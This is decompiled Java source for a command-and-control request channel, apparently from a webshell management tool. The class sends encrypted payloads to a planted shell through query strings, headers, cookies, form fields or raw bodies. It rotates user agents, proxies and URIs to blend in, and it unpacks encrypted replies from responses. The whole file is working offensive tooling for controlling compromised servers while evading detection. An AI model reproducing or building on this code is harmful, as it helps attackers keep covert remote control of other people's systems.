//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.channel;

import core.ProxyT;
import core.c2profile.C2Profile;
import core.c2profile.C2ProfileContext;
import core.c2profile.C2Request;
import core.c2profile.C2Response;
import core.c2profile.c2enum.RequestChannelEnum;
import core.c2profile.config.BasicConfig;
import core.c2profile.config.CoreConfig;
import core.c2profile.exception.UnsupportedOperationException;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import util.functions;
import util.http.Http;
import util.http.HttpResponse;

public class C2ProfileHttpRequestChannel extends RequestChannel {
    protected Http http;
    protected Proxy defaultProxy;
    protected URL url;
    protected C2ProfileContext c2ProfileCtx;
    protected C2Profile c2Profile;
    protected BasicConfig basicConfig;
    protected CoreConfig coreConfig;
    protected C2Request c2Request;
    protected C2Response c2Response;
    protected String c2RequestParamName;
    protected String responseParamName;
    protected LinkedHashMap<String, LinkedList<String>> c2Headers;
    protected LinkedHashMap<String, String> uriParams;

    public C2ProfileHttpRequestChannel(ShellEntity ctx, C2ProfileContext c2ProfileCtx) {
        super(ctx);
        this.http = new Http(ctx);
        this.c2ProfileCtx = c2ProfileCtx;

        try {
            this.url = new URL(ctx.getUrl());
        } catch (MalformedURLException var4) {
            throw new RuntimeException(var4.getMessage());
        }

        this.c2Profile = c2ProfileCtx.c2Profile;
        this.c2Request = this.c2Profile.request;
        this.c2Response = this.c2Profile.response;
        this.c2Headers = this.c2Request.requestHeaders;
        this.basicConfig = this.c2Profile.basicConfig;
        this.coreConfig = this.c2Profile.coreConfig;
        this.c2RequestParamName = c2ProfileCtx.requestChannelType.name;
        this.responseParamName = c2ProfileCtx.responseChannelType.name;
        ctx.setMergeResponseCookie(this.c2Profile.basicConfig.mergeResponseCookie);
        this.http.setChunked(this.c2Profile.basicConfig.useHttpChunk);
        this.http.setChunkLen(this.c2Profile.basicConfig.httpChunkLen);
        this.uriParams = functions.parseRequestParams(this.url.getQuery(), false, new LinkedHashMap());
        this.uriParams.putAll(this.c2Request.requestUrlParameters);
        if (!this.c2Request.requestMethod.equalsIgnoreCase("GET")) {
            LinkedList<String> contentTypes = (LinkedList)this.c2Headers.get("Content-Type");
            if (contentTypes == null) {
                contentTypes = (LinkedList)ctx.getHeaders().get("Content-Type");
                if (contentTypes == null) {
                    contentTypes = new LinkedList();
                    this.c2Headers.put("Content-Type", contentTypes);
                    contentTypes.addFirst("application/octet-stream");
                    if (c2ProfileCtx.requestChannelType.requestChannelEnum == RequestChannelEnum.REQUEST_POST_FORM_PARAMETER) {
                        contentTypes.clear();
                        contentTypes.addFirst("application/x-www-form-urlencoded");
                    }
                }
            }
        }

        if (this.c2Profile.basicConfig.enabledHttpsClientCertTrusted) {
            this.http.setSslSocketFactory(c2ProfileCtx.sslSocketFactory);
        }

    }

    public byte[] sendRequest(byte[] data) {
        byte[] requestData = new byte[0];
        boolean isProcessCookie = false;
        StringBuilder urlBuilder = new StringBuilder();
        urlBuilder.append(this.url.getProtocol());
        urlBuilder.append("://");
        urlBuilder.append(this.url.getAuthority());
        urlBuilder.append(this.getUri());
        LinkedHashMap<String, LinkedList<String>> headerMap = null;
        if (this.basicConfig.mergeBasicHeader) {
            headerMap = (LinkedHashMap)this.ctx.getHeaders().clone();
        } else {
            headerMap = new LinkedHashMap();
        }

        LinkedHashMap<String, String> cookieMap = new LinkedHashMap();
        LinkedList<String> _list = null;
        _list = (LinkedList)headerMap.get("Cookie");
        if (_list != null) {
            functions.formatCookie((String)_list.getFirst(), cookieMap);
        }

        _list = (LinkedList)this.c2Headers.get("Cookie");
        if (_list != null) {
            functions.formatCookie((String)_list.getFirst(), cookieMap);
        }

        cookieMap.putAll(this.c2Request.requestCookies);
        headerMap.putAll(this.c2Headers);
        if (this.c2Request.enabledRandomUserAgent && this.c2Request.randomUserAgentList.length > 0) {
            _list = new LinkedList();
            _list.add(this.getUserAgent());
            headerMap.put("User-Agent", _list);
        }

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();

        try {
            buffer.write(this.c2Request.requestChannelStartAppend);
            buffer.write(this.cryption.encode(data));
            buffer.write(this.c2Request.requestChannelEndAppend);
        } catch (IOException var15) {
            var15.printStackTrace();
        }

        LinkedHashMap params;
        switch (this.c2ProfileCtx.requestChannelType.requestChannelEnum) {
            case REQUEST_QUERY_STRING:
                isProcessCookie = true;
                urlBuilder.append("?");
                urlBuilder.append(URLEncoder.encode(new String(buffer.toByteArray())));
                break;
            case REQUEST_URI_PARAMETER:
                isProcessCookie = true;
                params = new LinkedHashMap();
                params.putAll(this.uriParams);
                params.put(this.c2RequestParamName, URLEncoder.encode(new String(buffer.toByteArray())));
                urlBuilder.append("?");
                urlBuilder.append(functions.parseRequestParamsToStr(params));
                break;
            case REQUEST_HEADER:
                LinkedList<String> headerLine = (LinkedList)headerMap.get(this.c2RequestParamName);
                headerLine.clear();
                headerLine.addFirst(new String(buffer.toByteArray()));
                break;
            case REQUEST_COOKIE:
                cookieMap.put(this.c2RequestParamName, URLEncoder.encode(new String(buffer.toByteArray())));
                break;
            case REQUEST_POST_FORM_PARAMETER:
                params = (LinkedHashMap)this.c2Request.requestFormParameters.clone();
                params.put(this.c2RequestParamName, URLEncoder.encode(new String(buffer.toByteArray())));
                requestData = functions.parseRequestParamsToStr(params).getBytes();
                break;
            case REQUEST_RAW_BODY:
                requestData = buffer.toByteArray();
                break;
            default:
                throw new UnsupportedOperationException("不支持的C2通道 " + this.c2ProfileCtx.requestChannelType.toString());
        }

        if (!isProcessCookie) {
            String query = this.url.getQuery();
            if (query != null) {
                urlBuilder.append("?");
                urlBuilder.append(this.url.getQuery());
            }
        }

        if (this.c2ProfileCtx.requestChannelType.requestChannelEnum != RequestChannelEnum.REQUEST_RAW_BODY && this.c2ProfileCtx.requestChannelType.requestChannelEnum != RequestChannelEnum.REQUEST_POST_FORM_PARAMETER && !this.c2Request.requestMethod.equalsIgnoreCase("GET") && this.c2Request.requestBody.length > 0) {
            requestData = this.c2Request.requestBody;
        }

        if (cookieMap != null && cookieMap.size() > 0) {
            LinkedList<String> headerLine = (LinkedList)headerMap.get("Cookie");
            if (headerLine == null) {
                headerLine = new LinkedList();
                headerMap.put("Cookie", headerLine);
            } else {
                headerLine.clear();
            }

            headerLine.addFirst(functions.formatCookieToStr(cookieMap));
        }

        HttpResponse response = this.http.SendOkHttpConn(urlBuilder.toString(), this.c2Request.requestMethod, headerMap, requestData, this.ctx.getConnTimeout(), this.ctx.getReadTimeout(), this.getProxy());
        switch (this.c2ProfileCtx.responseChannelType.responseChannelEnum) {
            case RESPONSE_HEADER:
                data = response.getHeader(this.responseParamName).getBytes();
                break;
            case RESPONSE_COOKIE:
                data = URLDecoder.decode(response.getCookie(this.responseParamName)).getBytes();
                break;
            case RESPONSE_RAW_BODY:
                data = response.getResult();
                break;
            default:
                throw new UnsupportedOperationException("不支持的C2通道 " + this.c2ProfileCtx.responseChannelType.toString());
        }

        int arrStartIndex = 0;
        int arrEndIndex = 0;
        if (data == null) {
            return null;
        } else {
            if (this.c2Response.responseChannelStartAppend.length > 0) {
                arrStartIndex = functions.byteArrayIndexOf(data, this.c2Response.responseChannelStartAppend);
            }

            if (arrStartIndex == -1) {
                return null;
            } else {
                arrStartIndex += this.c2Response.responseChannelStartAppend.length;
                if (this.c2Response.responseChannelEndAppend.length > 0) {
                    arrEndIndex = functions.byteArrayIndexOf(data, this.c2Response.responseChannelEndAppend, arrStartIndex);
                }

                if (arrEndIndex == -1) {
                    return null;
                } else {
                    byte[] realData = null;
                    if (arrStartIndex == 0 && arrEndIndex == 0) {
                        realData = data;
                    } else if (arrStartIndex == 0 && arrEndIndex != 0) {
                        realData = new byte[arrEndIndex];
                        System.arraycopy(data, 0, realData, 0, realData.length);
                    } else if (arrStartIndex > 0 && arrEndIndex == 0) {
                        realData = new byte[data.length - arrStartIndex];
                        System.arraycopy(data, arrStartIndex, realData, 0, realData.length);
                    } else if (arrStartIndex > 0 && arrEndIndex > 0) {
                        realData = new byte[arrEndIndex - arrStartIndex];
                        System.arraycopy(data, arrStartIndex, realData, 0, realData.length);
                    }

                    return this.cryption.decode(realData);
                }
            }
        }
    }

    protected String getUri() {
        String uri = this.c2Profile.basicConfig.enabledBalanceUris && this.c2Profile.basicConfig.uris != null && this.c2Profile.basicConfig.uris.length > 0 ? this.c2Profile.basicConfig.uris[functions.randomInt(this.c2Profile.basicConfig.uris.length, 0)] : this.url.getPath();
        if (uri != null && uri.endsWith("/*")) {
            return uri.substring(0, uri.length() - 1) + functions.getRandomApiPath();
        } else {
            return uri;
        }
    }

    protected Proxy getProxy() {
        if (!this.c2Profile.basicConfig.useDefaultProxy && this.c2ProfileCtx.proxyList.size() > 0) {
            return (Proxy)this.c2ProfileCtx.proxyList.get(functions.randomInt(this.c2ProfileCtx.proxyList.size(), 0));
        } else {
            if (this.defaultProxy == null) {
                this.defaultProxy = ProxyT.getProxy(this.ctx);
            }

            return this.defaultProxy;
        }
    }

    protected String getUserAgent() {
        return this.c2Request.randomUserAgentList[functions.randomInt(this.c2Request.randomUserAgentList.length - 1, 0)];
    }

    public Http getHttp() {
        return this.http;
    }
}
